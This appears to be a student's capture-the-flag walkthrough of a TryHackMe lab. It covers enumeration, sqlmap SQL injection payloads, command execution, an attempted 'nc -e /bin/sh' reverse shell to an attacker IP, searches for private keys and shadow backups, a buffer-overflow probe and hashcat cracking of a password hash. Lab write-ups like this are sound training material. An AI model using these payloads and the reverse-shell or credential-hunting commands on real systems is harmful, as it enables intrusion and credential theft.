## A. Enumeration

## A.1 nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d2c401b6c157cfcbf9b5522612a56fc (RSA)
|   256 ff893298f4779c0939f5af4a4f08d6f5 (ECDSA)
|_  256 899263e71d2b3aaf6cf939565b557ef9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
```


## A.2 HTTP

1. index.html is a default apache server installation
2. found nothing in source code and robots.txt 
3. ran a gobuster to find directories

```
┌─[glack@parrot]─[~/Desktop/THM/Lian_Yu]
└──╼ $gobuster dir -u http://10.10.34.3/ -w /usr/share/wordlists/small.txt -x php,html -t 60
```

found a login page

```
/administrator.php    (Status: 200) [Size: 409]
```

now as per THM room, we can use sqlmap for sql injection attacks, so lets try that

Note: sqlmap is not allowed on the OSCP exam, so i will limit my use of this tool for this room only.

SQLmap basically automates all of the exploit.


Stopped here because didnt wanna continue with automated tools


### SQLMAP
- restarted here again to complete the room

- sqlmap gives three types of SQLI vulns
```
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=QPLw' RLIKE (SELECT (CASE WHEN (5221=5221) THEN 0x51504c77 ELSE 0x28 END))-- tiQK&password=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=QPLw' AND GTID_SUBSET(CONCAT(0x7171707071,(SELECT (ELT(8200=8200,1))),0x7178717671),8200)-- avEM&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=QPLw' AND (SELECT 3691 FROM (SELECT(SLEEP(5)))BHcP)-- GEig&password=
```

and we get this

```
[1 entry]
+------------+----------+
| password   | username |
+------------+----------+
| secretpass | pingudad |
+------------+----------+

```

### RCE

- after logging in we are redirected to `http://10.10.8.199/2591c98b70119fe624898b1e424b5e91.php`

here can can execute commands as `www-data`
`uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)`

- this does not gives a reverse shell `nc -e /bin/sh 10.17.24.189 9999`

- `ls -al /home` gives this 
```
drwxr-xr-x  5 papa  papa  4096 Jan 15  2020 papa
drwxrwxrwx  6 pingu pingu 4096 Jan 20  2020 pingu
```

- `find / -type f -user papa -ls 2>/dev/null` this gives
`/var/backups/shadow.bak`

however not able to read it 

- `find / -type f -user pingu -ls 2>/dev/null` this gives

```
1061093      4 -rwxrwxrwx   1 pingu    pingu        1675 Jan 15  2020 /home/pingu/.ssh/id_rsa

  1061094      4 -rwxrwxrwx   1 pingu    pingu         394 Jan 15  2020 /home/pingu/.ssh/id_rsa.pub
```

we have read access

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArfwVtcBusqBrJ02SfHLEcpbFcrxUVFezLYEUUFTHRnTwUnsU
.
.
.
pOq0JjdnM+KJtB4ae8UazL0cSJ52GYbsNABrcGEZg6m5pDJD3MM=
-----END RSA PRIVATE KEY-----
```

- we are able to ping ourselves but reverse shell commands are not working
- used [[RCE to reverse shell - php]]

- when using the ssh private rsa key we are still prompted for a password


- found this as SUID bit binary `/opt/secret/root` - maybe after we get a user shell because this does nothing

- found this in `cat administrator.php`

```
$servername = "localhost";
    $username = "root";
    $password = "root"
```

- we can login into `mysql` using
```
www-data@ubuntu:/var/www/html$ mysql -u root -p

```

- but we get the same details we get in `sqlmap`

- used hint from the writeup 

`find / -type f -user www-data -ls 2>/dev/null`
we get this `/var/hidden/pass`

```
www-data@ubuntu:/var/hidden$ cat pass
cat pass
pinguapingu
```

### Priv ESC 

- pingu creds are
```
pingu:pinguapingu
```

- room has the source code of `/opt/secret/root`
```
`#include "unistd.h"   #include "stdio.h"   #include "stdlib.h"   void shell(){   setuid(1000);   setgid(1000);   system("cat /var/backups/shadow.bak");   }      void get_input(){   char buffer[32];   scanf("%s",buffer);   }      int main(){   get_input();   }`
```

- as per room instructions - ran this command in the ssh session ``gdb /opt/secret/root``

- then this ``r < <(cyclic 50)``

- stopped with the `pwndbg` as it was going over my head and skipped to hash cracking

- we have to crack this hash now ``$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.``


this is a  
|1800|sha512crypt $6$, SHA512 (Unix) 2| - https://hashcat.net/wiki/doku.php?id=example_hashes

using hashcat to crack the hash
```
┌─[glack@parrot]─[~/Desktop/THM/thecodcaper]
└──╼ $hashcat -a 0 -m 1800 forhash /usr/share/wordlists/rockyou.txt
```

we get a hit

```
love2fish
```

- there are no flags in this machine
